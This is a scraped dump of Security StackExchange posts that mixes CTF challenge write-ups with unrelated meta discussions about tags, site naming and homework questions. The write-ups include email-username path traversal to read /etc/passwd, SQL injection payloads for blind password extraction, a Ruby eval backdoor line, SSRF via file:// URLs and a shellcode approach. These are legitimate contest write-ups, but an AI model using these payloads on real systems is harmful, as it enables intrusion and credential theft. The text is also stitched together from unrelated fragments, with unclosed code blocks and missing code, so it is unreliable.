<p>This is a file upload service over email. We can send commands: <code>signup</code>, <code>list</code>, <code>put</code>, <code>get</code>, <code>delete</code>, <code>share</code>. The user name is taken from the email's <code>From:</code> address.</p>

<p>Looking at the server source code, we can see that user names are not validated. The directory of a user whose address is <code>username@example.com</code> is <code>example.com___username</code>. If you want to receive the replies to your commands, you need to use a domain where you can receive mail, but many domains give you some variation on the username, which allows you to append interesting suffixes to the user directory. In particular, many servers (including GMail) redirect all addresses of the form <code>username+suffix@example.com</code> to the main <code>username@example.com</code> address. Alternatively, you can use a disposable email service such as <a href=""http://mailinator.com"" rel=""nofollow"">http://mailinator.com</a>.</p>

<p>The main trick is to use <code>../</code> in the user name to escape our user directory. For example, supposing you are <code>eve@gmail.com</code>, sign up as <code>eve+@gmail.com</code>. This creates the user directory <code>gmail.com___eve+</code>. You can then use usernames of the form <code>eve+/../something</code> to access directories on the server of the form <code>gmail.com___eve+/../something</code>. For example, you can access the account of <code>alice@example.com</code> via <code>eve+/../example.com___alice@gmail.com</code>.</p>

<p>Armed with this trick, we explored the filesystem. There were many red herrings, left either by the contest organizers or by other contestants. The addresses mentioned in the problem description (<code>hans@ck.er</code> and <code>sales@cloud.cloud</code>) both had an account, as did <code>admin@b3.ctf.sigint.ccc.de</code> and <code>test@b3.ctf.sigint.ccc.de</code>. We could access the user list by sending the <code>list</code> command as <code>eve+/..@gmail.com</code>. None of these led to the flag, though.</p>

<p>Finally Manishearth thought of looking at <code>/etc/passwd</code> (<code>get passwd</code> from <code>eve+/../../../../etc@gmail.com</code>), where the flag was hiding in the Gecos field of the <code>challenge</code> user.</p>

<h1>14. punchcard</h1>

<p>We get a images of punchcards. The first step is to parse them into text — write a software punchcard reader. These are <a href=""http://en.wikipedia.org/wiki/Punch_card#IBM_80-column_punched_card_formats_and_character_codes"" rel=""nofollow"">IBM 80-column punched cards</a> and the encoding turns out to be EBCDIC.</p>

<h1>16. rsa</h1>

<p>We get an <code>authorized_keys</code> file and a Python script that generates an SSH key pair. The key is generated using a simple pseudorandom generator that uses the time as the seed. We have the public key in <code>authorized_keys</code> file, so we need to find the seed time that corresponds to that public key.</p>

<p>First, the PRNG is extremely slow as written because it's computing insanely large numbers. Only the lowest-order bits of these numbers are ever used, so we can truncate them. 32 bits are enough and make the speed sufficient.</p>

<p>Second, extract the modulus from the SSH public key.</p>

<pre><code>ssh-keygen -m PKCS8 -e -f authorized_keys |
sed -e '1d' -e '$d' |
hexdump -C1
</code></pre>

<p>This plus a bit of manual ASN.1 decoding gives us a 1024-bit modulus and the public exponent 65537.</p>

<p>Now we brute-force the seed, working backwards from the starting time of the contest.</p>

<h1>17. satisfaction</h1>

<p>The server reads a Brainfuck program and a signature. It computes the signature of the program; if the signature is valid, the brainfuck program is executed. It must output a Ruby snippet which is executed through <code>eval</code>.</p>

<p>Let's look at the signature first. <code>sig</code> is the signature read from the input, and <code>$d</code> and <code>$n</code> are unknown.</p>

<pre><code>crc = crc32(code)
test = crc.to_bn.mod_exp($d, $n)
return sig == test
</code></pre>

<p>Without knowing <code>$d</code> and <code>$n</code>, we cannot find the correct <code>sig</code> value! Except, that is, if <code>crc</code> is 0 or 1, in which case the signature is 0 or 1. So we will strive to produce code whose CRC is 0 or 1.</p>

<p>The Brainfuck code must output a Ruby shellcode. This shellcode is executed through <code>eval</code>. Its standard input and standard output are not connected to the network socket. Furthermore, a look at the Brainfuck interpreter shows that the Brainfuck code must execute for no more than 1000 steps and has access to 100 memory cells. After a few false tries, I settled on <code>client.puts`#{client.gets}`</code>, which is produced by this simple Brainfuck code (which we'll strip of its whitespace before submission):</p>

<p>Now we need to pad this program so that the resulting CRC is 0 or 1. We're only allowed to use the characters <code>-+&lt;&gt;[].</code> — active Brainfuck characters plus space. I wrote a program to compute CRC values and brute-force a padding with a desired CRC. Since there are 7 possible characters (skipping <code>.</code> which might result in broken output), and 2³¹ ≈ 7¹¹, we can expect that there is a 12-character padding that produces a suitable value.</p>

<h1>18. PROtocol</h1>

<p>We're told to connect to a certain IP and port. But it's not tcp and not udp. MMavipc (I think) observed that there was a response on <a href=""http://en.wikipedia.org/wiki/SCTP"" rel=""nofollow"">SCTP</a> port 1024. On every connection, <code>socat - SCTP-CONNECT:188.40.147.103:1024</code> produces a string like the following:</p>

<pre><code>945c7bceb37fTa27dadbd7cI9cde8d43I5286153c94a16f3da3df0cf3819152a509952d50fdb_ad23G81ec5489bf62ced620N0Sa02c
</code></pre>

<p>Some observations:</p>

<ul>
<li>The server doesn't seem to read any input, it emits a 107-byte string per connection every time.</li>
<li>The 107-byte string is always a permutation of the same string, which contains <code>SIGINT_</code> and 100 hexadecimal digits.</li>
<li>The permutation depends on the time: it's different at almost every connection, except that two near-simultaneous connections result in the same string.</li>
</ul>

<p>MMavipc made the second crucial observation that the packets need to be reordered by SID (stream identifier). So I looked at one connection with <code>tcpdump</code> and saw that I was receiving 1-byte packets out of order, like this:</p>

<pre><code>    1) [DATA] (B)(E) [TSN: 1096613863] [SID: 74] [SSEQ 0] [PPID 0x0] [Payload:        0x0000:  62                                       b
    1) [DATA] (B)(E) [TSN: 1096613863] [SID: 74] [SSEQ 0] [PPID 0x0] [Payload:        0x0000:  62                                       b
    2) [DATA] (B)(E) [TSN: 1096613864] [SID: 60] [SSEQ 0] [PPID 0x0] [Payload:        0x0000:  37                                       7
    3) [DATA] (B)(E) [TSN: 1096613865] [SID: 10] [SSEQ 0] [PPID 0x0] [Payload:        0x0000:  33                                       3
</code></pre>

<p>Note that in this trace one packet was duplicated, it needs to be included only once. From this trace (which should have all SIDs from 0 to 106) sorting the packets and extracting the payloads is an easy one-liner:</p>

<p>This basically accepts GET requests to <code>localhost</code>, and returns the corresponding file. </p>

<p>You can use this simple bash script to talk to it:</p>

<pre><code>#!/bin/bash
echo -e 'GET '$1' HTTP/1.1\r\n\r\n'|nc 188.40.147.125 8080

<p>So there was a <code>lighttpd</code> server on port 80 (and an <code>index.html</code> file). Poking around on this server, we found nothing. (This was a red herring)</p>

<p>I  was trying to see if I could fool <code>urlparse</code> into picking up the wrong <code>netloc</code>. An interesting case was a URL like <code>example.com://localhost</code>. It does indeed fool <code>urlparse</code>, and at the same time it fetches <code>http://example.com/localhost</code> in Chrome. However, <code>urllib2</code> coughs up on it. It seemed like <code>urlparse</code> and <code>urllib2</code> had the same way of looking at URLs. Bummer.</p>

<p>Finally, lynks got it. He realized that <code>file://</code> worked perfectly well in <code>urllib2</code>, and fetching <code>file://localhost/etc/passwd</code> you get </p>

<h1>baremetal</h1>

<p><a href=""https://security.stackexchange.com/users/9377/lynks"">Lynks</a> and I worked on this challenge as a team.</p>

<p>We were given an executable file named <code>baremetal</code>, an IP address, and a port.</p>

<pre><code>$ file baremetal
baremetal: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, stripped
</code></pre>

<p>First, we looked for strings in the file and ran it (in a safe environment).</p>

<pre><code>$ strings baremetal
~Fh
baremetal online
Sequence OK
Bad Sequence
$ ./baremetal
baremetal online
&lt;here it pauses so we send the program a random line of data&gt;
Bad Sequence
$ strace ./baremetal
execve(""./baremetal"", [""./baremetal""], [/* 40 vars */]) = 0
[ Process PID=16342 runs in 32 bit mode. ]
write(1, ""baremetal online\n"", 17baremetal online
)      = 17
read(0, randomdata
""randomdata\n"", 61)             = 11
write(1, ""Bad Sequence\n"", 13Bad Sequence
)          = 13
_exit(0)                                = ?
+++ exited with 0 +++
</code></pre>

<p>The program reads 61 bytes from stdin. We determined that the same program was being hosted on the port/IP address that we were given.</p>

<pre><code>$ netcat &lt;ip&gt; &lt;port&gt;
baremetal online
&lt;sent some random data&gt;
Bad Sequence
</code></pre>

<p>We disassembled the program's .text section and mapped it out a bit.</p>

<p>We determined that in order to get the program to print ""Sequence OK"", we had to send it a string that was at least 32 bytes in length and had a byte-sum of 7911. The data that the program read from stdin was loaded into memory at address <code>0x80491c8</code>. At address <code>0x80480a5</code>, the program loads four bytes into memory at address <code>0x8049204</code>, 60 bytes above the address at which the data read from stdin is loaded into memory, for execution right before ""Sequence OK"" is printed (address <code>0x80480f9</code>).</p>

<pre><code>804809f:   8d 05 04 92 04 08    lea    0x8049204,%eax
80480a5:   c7 00 47 47 ff e7    movl   $0xe7ff4747,(%eax) ; loading the instructions into memory
</code></pre>

<p>Here are the four bytes that are executed:</p>

<pre><code>8049204:   46      inc    %edi
8049205:   46      inc    %edi
8049206:   ff e7   jmp    *%edi
</code></pre>

<p>Since 61 bytes are read from stdin, we are able to overwrite one byte. Naturally, we looked for ways to execute the rest of the data read from stdin. We generated a list of possibilities and realized that if we overwrote the first byte with <code>0x97</code>, the instructions would become</p>

<pre><code>8049204:   97      mov    %eax,%edi
8049205:   46      inc    %edi
8049206:   ff e7   jmp    *%edi
</code></pre>

<p>It just so happened that the <code>%eax</code> register contained the start address of the data read from stdin. <code>%edi</code> was incremented before the jump so we were able to jump to the second byte of our data. We wrote a script to generate some simple <code>exec /bin/sh</code> shellcode.</p>

<pre><code>#!/bin/bash

  <p>We invite all of you to come play our CTF titled ""ebCTF"" held during the biggest quadrennial (every 4 years) Dutch hacker gathering OHM2013 (predecessors are HIP1997, HAL2001, WTH2005 and HAR2009). For the unfortunate ones who cannot make it to the camping site in the Netherlands we of course offer the ability to play online/remotely as well!</p>
  
  <p>Eindbazen will be hosting the competition live from the camping site. You can come and work on hacking challenges in our ebCTF hideout, from your own tent.. or maybe even from a very distant remote location! The only requirement is a working internet connection. Of course you can also just come hang out at the ebCTF hideout, meet up with other CTF/security enthousiasts, have a drink... and plan world domination together! (…)</p>
  
  <p>We're very much looking forward to provide you with a unique and genuine CTF experience during ebCTF and would like to stress again that the ""full experience"" can only be had on-site, at OHM2013 (July 31 - 4 August 2013). So do not hesitate any further and start planning your vacation to the Netherlands right NOW!</p>

1347,2,2013-07-21T19:58:01.450,4,,"<h2>Web100: <i>""A1 Galaxy""</i><br />status: partially completed</h2> 

<p>This was the first challenge in the <em>Web</em> series, and completion would secure us 100 points. The challenge involved finding ways to test for possible passwords in multi-level authorisation pages. With the big help from <a href=""https://security.stackexchange.com/users/10414/p-h"">@p____h</a>, I've managed to pass first two authorisations, and extract <code>username</code>, <code>level1_password</code> and <code>level2_password</code>:</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src=""https://i.stack.imgur.com/5MK8f.png"" alt=""Web100 - authorisation level 3""></p>

<p>The first authorisation page asked for a <code>username</code> and <code>password</code> only, and the input was not sanitized in any way whatsoever. This meant we could try with the simplest of SQL injections: <code>"" or 1=1 or ""</code> on any of the fields (or both) and got out the username <code>admin1</code> when presented with the 2nd level authorisation form:</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src=""https://i.stack.imgur.com/pGtRb.png"" alt=""Hello, admin1""></p>

<p>But the authorisation process was still able to determine that we cheated, so we'll need to actually extract the password, to be able to continue to level 3 authorisation. The <code>robots.txt</code> file published at the web root gave a few hints: </p>

<pre><code>User-agent: *
Disallow: /forgot_username_and_password.txt 
</code></pre>

<p>And the <a href=""http://a1galaxy.tasks.ufoctf.ru/forgot_username_and_password.txt"" rel=""nofollow noreferrer"">/forgot_username_and_password.txt</a> location let us know the length of the password:</p>

<pre><code>username: ******
password: **********************
</code></pre>

<p>So the password length is 22 characters long. If we had to brute-force for all the possible values in the character space of 52 possible <code>[a..Z]</code> values (educated guess, but it could have been more than that), that would be 52<sup>22</sup> values, and clearly too many to test on. But, since the input on level 1 wasn't sanitized at all, this wasn't too difficult and meant we could test for existence of a single character at a certain password position using <code>substr</code> SQLite function (we've determined what database engine is running the backend based on commands it was accepting). So we could simply iterate through all 22 positions and test for these <code>(52/2)+1</code> or 27 values, as it could be further optimized to match lowercase values only, and later determine with a single injection, if the character tested was upper or lowercase. This would look something like this: <code>"" or (1=1 and lower(substr(password,1,1)) == ""c"") or ""</code>.</p>

<p>If the login form would let us pass (and report an error it was hacked), that means we've determined the character for the <code>n</code>-th position, leaving us only at most 27*22 values to try on (or 594 tests, which is obviously a lot better than 52<sup>22</sup>).</p>

<p>The first password was successfully extracted and turned out to be: <code>MyPasswordIsNotTheFlag</code>.</p>

<p>The second password (level 2 authorisation) was somewhat easier. While the input was sanitized, it was rather poorly so, and let us determine the string matching in its internal SQL query was based on the <code>LIKE</code> operator. This was again determined by <a href=""https://security.stackexchange.com/users/10414/p-h"">@p____h</a>. I've run a script to iterate through all possible values in the 62-letter address space (<code>[0..9,a..Z]</code>), using SQL injections ending the sought after password with <code>%</code> (matches any value that starts with previous characters when <code>LIKE</code> operator is used), for example: <code>0a%</code>.</p>

<p>The second password turned out to be really short: <code>0x42</code></p>

<p>But, we were only left with roughly 15 minutes to extract level 3 password, and no idea how to test against possible values yet. I've determined it must be a digits only password, and that it's most likely 12 digits long. This was due to the level 3 auth producing different error (<em>""level 3 password mismatch""</em>, instead of <em>""following errors occurred: wrong level 3 password 1, wrong level 3 password 2""</em>) when entering <code>0</code> or a non-integer value for these two input fields for password 3 (indicating the input matching defaults to <code>0</code> where type conversion fails), and when entering an integer value longer than 12 digits. In fact, I was able to narrow this down even further by establishing the value must be smaller than <code>444444444444</code> (blind test), but is bigger than <code>100000000000</code>. This would still leave us with too many possible values to try and the time run out.</p>

<p>So the login info successfully extracted was:</p>

<pre><code>username: admin1
level1_password: MyPasswordIsNotTheFlag
level2_password: 0x42
</code></pre>

<p>Still, for having roughly 2 times half an hour of spare time (Global economic crisis weekends FTW! - shuffle letters to FTW to get my intended meaning), and <a href=""https://security.stackexchange.com/users/10414/p-h"">@p____h</a> in the meantime working on other challenges, I think we did fairly well. We'll try better next time. ;)</p>

<p>We have a GIF that contains three 250x250 images, one mostly red, one mostly green, one mostly blue. Careful examination reveals that the first line of each gif isn't perfectly uniform but has #0000fe bytes interlaced with the #0000ff bytes (mutatis mutandis for the green and blue image). We xor the images together, tempted by the fact that at the beginning the \xff's and \xfe's mix with \x00's of the other image.</p>

<pre><code>{ echo P5; echo 300 300; echo 255; cat img.encode; } | pnmtopng &gt;img.png

<p>The resulting image is clearly a QR code with some impurities. I didn't have a tool handy that recognized the code even after converting the grayscale image to black and white (too many impurities?). Obsqr running on my smartphone didn't break a sweat and told me <code>9rypBzr_GB_7sBP6S</code>. However, this isn't the flag.</p>

<p>This is as far as I went. After the contest, I got the solution from <a href=""https://security.stackexchange.com/users/25859/hamza"">HamZa</a>: it's rot13 with a twist, that is: digits also need to be rotated (but the underscore remains as is).</p>

<pre><code>echo 9rypBzr_GB_7sBP6S | tr 0-9A-Za-z N-WN-ZA-Mn-za-m
WelcOme_TO_UfOCTF

<p>We have some plaintext files (<code>quote?.txt</code>) and what is presumably the associated ciphertext, plus <code>empty.png</code> and <code>flag.png</code>, in the form of PNG image. A quick look at the PNG files (e.g. conversion to PBM) shows that they are all grayscale and have identical grayscale values. The next obvious thing to try is the alpha channels.</p>

<pre><code>for x in *.png; do pngtopnm -alpha &lt;$x &gt;${x%.*}.alpha; done
</code></pre>

<p>The alpha channels consist of bytes <code>\xff</code> and <code>\xfb</code> (except <code>empty.png</code> which is all zero), with the trailing bytes being <code>\xff</code>. Let's pack them into 8-bit bytes. I initially chose <code>\xff</code> to be the 0, but it turns out to be 1.</p>

<pre><code>for x in *.alpha; do perl -we '
    scalar &lt;&gt; for 1..3;
    $line = &lt;&gt;;
    while ($line =~ s/^(........)//) {
        $_=$1; y/\xff\xfb/10/;
        $buf .= chr(oct(""0b$_""))
    }
    $buf =~ s/\0+$//; print $buf
' &lt;$x &gt;${x%.*}.enc; done
</code></pre>

<p>The resulting <code>quote?.enc</code> files are identical to the corresponding plaintext files <code>quote?.txt</code> (except for some trailing <code>\xff</code> padding). In <code>flag.enc</code>, we see (encoded in UTF-8)</p>

<pre><code>Here's your flag, enjoy :-): ⓒ⓪ⓕⓕⓔⓔ⑦⑤②ⓑ③②⑦⑧⑤ⓕ③①ⓓⓒ⑤⑦ⓕ①ⓔ⑨ⓒ③ⓕ⑧⓪ⓔ

<p>For the Unicode-challenged, these are <a href=""http://www.unicode.org/charts/PDF/U2460.pdf"" rel=""nofollow"">enclosed alphanumerics</a>, U+2460 through U+24FF. The flag is <code>c0ffee752b32785f31dc57f1e9c3f80e</code>.</p>

<p>We have an XDP file which encodes a PDF file. At the bottom of the PDF file is a comment with the password of the PDF file. <a href=""https://security.stackexchange.com/users/10414/p-h"">p____h</a> provided a decompressed version. There's a string in there that looks like a flag, but this isn't it. There's also some Javascript code, encoded with hexadecimal escapes. Here it is after some light reformatting.</p>

<pre><code>var resp = app.response({cQuestion:""Enter password"", cTitle:""Password"",});
if (resp == this.saveXML()) {
    var s = ""c0ffeed5838de68871c45374f04c865a"";
    var t = """" + this.resolveNode(""/flagKey"");
    var n = ""c0ffee"";
    var baz = 0;
    for (var i=6; i&lt;s.length; i+=2) {
        baz = parseInt(s.substr(i,2),16) ^ t.charCodeAt(i/2-3);
        a = baz.toString(16);
        if (a.length == 1) {
            n += ""0"" + a
        } else {
            n += a
        }
    }
    this.rawValue = n
} else {
    app.alert(""Incorrect password"")
}
</code></pre>

<p><code>flagKey</code> is <code>CXrgfTA4sBXz9SBehVirA4A61zOgkXbm</code>. Executing this JavaScript code (minus password check) with <code>t</code> set to the <code>flagKey</code> field of the XFA data yields <code>c0ffee96dbff81ee25856707b214fc63</code>, which is still not the flag.
(Or is <code>flagKey</code> encoded in Base64? That produces <code>c0ffeedcf96d9bb849744687056cd8df</code> which isn't correct either.)</p>

<p>After the contest ended, with <a href=""https://security.stackexchange.com/users/25859/hamza"">HamZa</a>, we realized that <code>this.resolveNode(""/flagKey"")</code> returns <code>null</code> (which makes sense: there's no node called <code>/flagKey</code>). With <code>t=""null""</code>, we get the correct flag value: <code>c0ffeebbf6e18a8871c45374f04c865a</code>.</p>

<p>Running the code in Acrobat Reader (which I didn't want to bother installing for the contest) also works, if you change the code to omit the password check.</p>

<p>Fair enough that we would like to encourage people to learn on their own, as this will make them learn a lot more, rather than simply giving them the answers; but put it this way: the fact that they are going to the trouble of asking the question is not an indication to wanting to find it out? It can perhaps be a very lazy approach, but nonetheless it is still better than people who do not bother doing their homework in first place. Also some of those questions, even though are from homework, are really good, so a lot more people would also benefit humongously from the answers provided. Plus, who really cares if that student is learning to his/her full potential? It's his/her time and money spent, but I, on another hand, just like many others who are really interested in learning as much as possible, will definitely look at the questions/answer and say: ""actually that is very good!"". </p>

<p>I can see that people may retort, saying that it is not fair to the  university/college/colleagues. I would pose the question: ""why not?"" If the resource is available online and the student managed to find it, it is already something. </p>

<p>When I seem to disagree with what appears to be the majority's opinion, my first thought is that I am wrong and so I seek to find strong counter-arguments to make me change my mind. So I am just trying to figure out what the general rationale behind this topic is.</p>

No, this would not be on topic here (although it's already been asked) - but I don't think this should be ontopic on <em>any</em> SE site, this specifically asks for product recommendations (""shopping list"" questions) which have been deemed to not be a good fit for StackExchange in general (and explicitly forbidden on most sites). </p></li>

This sounds more like a <a href=""http://superuser.com"">SuperUser</a> question, rather than a Sec.SE question.

I don't see how this is an answerable question on <em>any</em> site (and about any product), unless the original developer/designer/architect happen to stop by to answer. In fact, why not go ask them? </p></li>

<p>In general, I tend to disagree with ALL requests for ""my question is about [X], make me a tag [X]!"" from new users.<br>
First, because usually there already other tags that could fit, but the new user is just not aware of them; and second, because by definition a tag should not have a single question. Tags are used most of all for categorization (also searching and some SEO, but most of all the categorization) - a category of one is not really a category. When there multiple questions that should be categorized together, as in ""<em>this</em> question has something in common with <em>that</em> question"", then it makes sense to create a tag for them.<br>
Tags should not be used as a list of keywords that is a replacement for, or a summary of, the question itself. Indeed, tags should not add any new information not already present in the question (not saying this is the case here, just clarifying my position).   </p>

<p>Removing the tag now just saves on tag-cleanup later, especially after it gets misused a lot.... </p>

1403,2,2013-09-12T18:59:57.853,8,,"<p>We have renamed sites in the past when it became clear that their scope has either changed significantly or that the name was actively harmful. The most notable change was probably Fitness &amp; Nutrition becoming Physical Fitness. So, in principle, we're open to discussing the name change for this site as well. There are some technical considerations with doing that on a graduated site since the site design has to be adjusted to use the new name, but we can cross that bridge if/when we come to it. That isn't a showstopper in and of itself.</p>

<p>With that in mind, we discussed this specific proposal internally and we think ""Information Security"" would likely be a better name. <em>However</em>, it's not clear to us that there is strong consensus within the community here that supports it or that ""Information Security"" would definitely reflect the scope of the site in the long term.</p>

<p>I personally favour ""Information Security"" over a much broader ""Security"". I think you guys should be careful to avoid expanding your scope so much that anything and everything that's related to some type of security would become on-topic here. You want to maintain a reasonably narrow focus so that you keep attracting and keeping experts in that topic. If you start mashing together too many things that sound similar but actually have very little audience overlap (for example, most IT security specialists are likely not into picking physical locks), you risk fracturing your site to the point where it's just not going to maintain a cohesive community. </p>

<p>We aren't going to make any name changes <em>right now</em>. We'd like you guys to take more time to discuss where you see this site heading. This meta post is a start, and it includes a few examples of questions that aren't a fit with ""IT"", but we need to see a more clear consensus and direction before we proceed.</p>

The meaning of the tag is recovering from a security breach. It's a bit like <a href=""https://security.stackexchange.com/questions/tagged/incident-response"" class=""post-tag"" title=""show questions tagged &#39;incident-response&#39;"" rel=""tag"">incident-response</a>, but covering the aftermath rather than the immediate reaction.</p>

<p>Earlier today, there were a couple more questions with that tag, which were about recovering a forgotten password. I retagged them.</p>

<p>On the one hand, this meaning of <a href=""https://security.stackexchange.com/questions/tagged/recovery"" class=""post-tag"" title=""show questions tagged &#39;recovery&#39;"" rel=""tag"">recovery</a> seems reasonable. On the other hand, it's surprising that we'd end up with a single question about that topic. Is there a synonym that I've missed? Should we just use <a href=""https://security.stackexchange.com/questions/tagged/incident-response"" class=""post-tag"" title=""show questions tagged &#39;incident-response&#39;"" rel=""tag"">incident-response</a> for everything?

  into great details about the theory behind a good password hashing

<p>His 100k accomplishment is made even more remarkable when you take into account his alter ego, <a href=""https://security.stackexchange.com/users/5411/tom-leek"">Small Bear</a>.

<p>A quote from one of my favorite <a href=""https://security.stackexchange.com/a/33471/10211"">answers</a> by Small Bear. </p>

<blockquote>
  <p>Take five chimpanzees. Put them in a big cage. Suspend some bananas
  from the roof of the cage. Provide the chimpanzees with a stepladder.
  BUT also add a proximity detector to the bananas, so that when a chimp
  goes near the banana, water hoses are triggered and the whole cage is
  thoroughly soaked.</p>
  
  <p>Soon, the chimps learn that the bananas and the stepladder are best
  ignored.</p>
  
  <p>Now, remove one chimp, and replace it with a fresh one. That chimp
  knows nothing of the hoses. He sees the banana, notices the
  stepladder, and because he is a smart primate, he envisions himself
  stepping on the stepladder to reach the bananas. He then deftly grabs
  the stepladder... and the four other chimps spring on him and beat him
  squarely. He soon learns to ignore the stepladder.</p>
  
  <p>Then, remove another chimp and replace it with a fresh one. The
  scenario occurs again; when he grabs the stepladder, he gets mauled by
  the four other chimps -- yes, including the previous ""fresh"" chimp. He
  has integrated the notion of ""thou shallt not touch the stepladder"".</p>
  
  <p>Iterate. After some operations, you have five chimps who are ready to
  punch any chimp who would dare touch the stepladder -- and none of
  them knows why.</p>

<h2>Internals, 200 points.</h2>

<p>Solved jointly by @Gilles and @Manishearth.</p>

<p>We were presented with <a href=""https://ctf.fluxfingers.net/challenges/17"" rel=""nofollow"">this file</a> (<a href=""http://pastebin.com/8H71VEFZ"" rel=""nofollow"">paste</a>), which at first glance was a pdf.</p>

  <p>Think outside the box - being several types at once like an animal that can change its color. Excuse the inaccuracy, but that's what you're searching for.</p>
</blockquote>

<p>Opening it, however, gave rise to a pdf that just said ""no hint given"".</p>

<p>Looking deeper, it seemed to be in three parts. First, there was the pdf, which was ended with an <code>EOF</code>.</p>

<p>Secondly, there was a <a href=""http://pastebin.com/b63acAJq"" rel=""nofollow"">bunch of gibberish</a>. Finally, there was <a href=""http://pastebin.com/j7UpFPVE"" rel=""nofollow"">some base64-encoded data</a>.</p>

<p>Decoding the base64 data gave rise to an OpenOffice text document that said ""still no hint given"". Looking into the file, there was some xml with the text ""mad forensic skillz"" surrounded by <code>&lt;dc:title&gt;</code> tags. Nothing too interesting here.</p>

<p>It was pretty obvious that the gibberish was code, most probably Python. I realized that it was the rot13 of some python code, and after decoding it, I got <a href=""http://pastebin.com/r4sPySYw"" rel=""nofollow"">this</a>. Note that that is not <em>exactly</em> the rot13 of the initial gibberish, I have converted <code>qrpbqr (""zip"")</code> to <code>decode (""zip"")</code>, as Python accepts <code>zip</code> as an argument for <code>decode()</code> but not <code>mvc</code>.</p>

<p>Cleaning up the code and adding comments, we get:</p>

<pre><code>#Ciphertext to be decoded:
cipher=""H51\\\'Ux2J&amp;+(3Z;Uxcx0Xxs\x13h\x014$V!R($R&gt;\t/)R!\x01&lt;.\x13,N-aP4M4aRuG1-VuU0 GuH+a@0W=3R9\x01&gt;(_0\x01,8C0Rx    GuN6\""V|\x1ezKZ3\x014$]}R!2\x1d4S?7\x1au\x1fxs\t_\x01xa\x13&lt;Gx)R&amp;Ip2J&amp;\x0f93T#zj\x1c\x1ap\x13rk\x00g\x01e|\x13g\x19ju\x0ba\x18jt\x02o+xa\x13u\x01xa\x13%S1/Gu\x03\x1b.\\:N7.\\:N4o\x13\x0cN-3\x133M9&amp;\x13&lt;Rx A2WjiZ{DvaX0Xjh\x136N6\""R!\x01\x07rC0p\x138a\x1dc22ieu\x161Fw+=-@0\x1bRa\x13u\x01(3Z;UxcR\'F.s\x1c&gt;D!s\x13&lt;Rx,Z&amp;R1/Tw+R""
n = 0
import hashlib ,sys 
try :
    key = sys.argv[1] #get key from argument
except IndexError:
    sys.exit(""Key 1 missing in argv"")

f =getattr(hashlib ,""md5"")
while n &lt;(5*10**6):
    key = (f(key).digest()) #Repeatedly hash the key via md5
    n = n+1
key = key[:5].upper() #Take the last five characters of the new key and make them uppercase.
while len(key)&lt;len(cipher): 
    key = key *2 #Make the key as long as the ciphertext by duplicating it
plain = """".join(map(chr,[ord(a)^ord(b)for a,b in zip (cipher,key)])) #XOR the key with the cipher, deciphering the OTP
try :
    exec plain #Execute the plaintext. A successful execution means that we have found the correct key.
except :
    print ""Wrong Key!"", repr(plain)
</code></pre>

<p>Note that the actual decoding part takes a string consisting of a set of five characters repeating over and over again and pads it with the ciphertext.</p>

<p>Due to a misunderstanding of the <code>zip()</code> function, I started looking for ways to bruteforce the key (the five-byte version, not the original one before hashing) or obtain it from somewhere else.</p>

<p>At this point, @Gilles had a look. He realized that the python program would probably start with <code>import</code>. XORing <code>import</code> with the ciphertext gives us the first five characters of our repeated key; <code>!XA3U</code>. We create the repetitive key from this, and this decodes the ciphertext into:</p>

<pre><code>import sys
print ""Key 2 = leetspeak(what do you call a file that is several file types at once)?""
if len(sys.argv) &gt; 2:
    if hash(sys.argv[2])%2**32 == 2824849251:
        print ""Coooooooool. Your flag is argv2(i.e. key2) concat _3peQKyRHBjsZ0TNpu""
else:
    print ""argv2/key2 is missing""
</code></pre>

<p>Running this asks us for a second key, which we have to guess from the hint ""What do you call a file that is several file types at once"". Putting this together with the hint ""Being several types at once like an animal that can change its color"", I get the second key as <code>ch4m3l30n</code> (chameleon), which worked. This gives us the flag <code>ch4m3l30n_3peQKyRHBjsZ0TNpu</code>.</p>

1437,2,2013-10-26T12:55:22.083,2,,"<p>At least the Tor question should be either on the <a href=""https://tor.stackexchange.com/"">Tor site</a>, or here on the main site. Indeed, it is a question about traffic analysis and correlation of data, which seems more on-topic on security.SE than on crypto.SE. Of course we can argue that cs.SE or crypto.SE seem <em>related</em>, but that's the lot of most questions on security.SE: when there is security and computers are involved, Computer Science and cryptography are never too far away.</p>

<p>The other one (the 2046-bit question) would be better on StackOverflow because it only calls for a generic answer which explains that the ""size"" of a processor is a pure question of performance (existing computers have no trouble using 2046-bit value right now; having registers with that size may just speed up operations a bit, but not significantly). Although I could engage in a discussion comparing password cracking performance on a GPU and on a CPU with SIMD instructions (a 2048-bit register would allow for 64 32-bit operations in parallel)(a good GPU would still win, though).</p>

<p>To sum up, I see nothing wrong in theoretical questions per se. We answer theoretical questions all the time. Answers tend to have a ""practical viewpoint"" (for instance, when talking about 256-bit encryption, a security.SE answer will often explain why that's overkill in practice) but theory of security is still on-topic. Which does not prevent any particular question from being off-topic, not because it is about theory, but because it is about theory of something which is not information security.</p>

<p>By the way, on Stack Exchange, there are no discussion groups. Stack Exchange is a network of <a href=""https://security.stackexchange.com/about"">questions and answers</a> sites. Calling them “group” or “site” is a matter of terminology, but the difference between discussion and Q&amp;A is important.</p>

<p>This site is the right place.</p>

<p>But the <a href=""https://security.stackexchange.com/questions/45772/skype-removal-on-windows"">question you link to</a> is not about getting a risk evaluation. It's about how to accomplish a particular task, and the task is a system administration task, not a security task. This is the job of a system administrator, not the job of a security professional. That's why this question is off-topic here. The question would be on-topic on <a href=""https://superuser.com/"">Super User</a>, a site for computer users and amateur administrators, or possibly on <a href=""https://serverfault.com/"">Server Fault</a>, a site for professional system administrators dealing with enterprise software and hardware.</p>

<p>There are times when including that advice in an answer is called for, but after a casual skim of the ""hot"" questions, I see the phrase is something of a universal signature.</p>

<p>The main issue I have with it is if you don't roll your own crypto (and see it crash and fail), how will you ever learn? One could say this site does just that: Post a really clever scheme, and see it torn apart.</p>

<p>A justified inclusion of the phrase in an answer IMO would be in an answer to the <a href=""https://security.stackexchange.com/q/25585/22490"">Dave</a> variety, where the scheme in question is used in production, and someone's paycheck (or more) depends on it.</p>

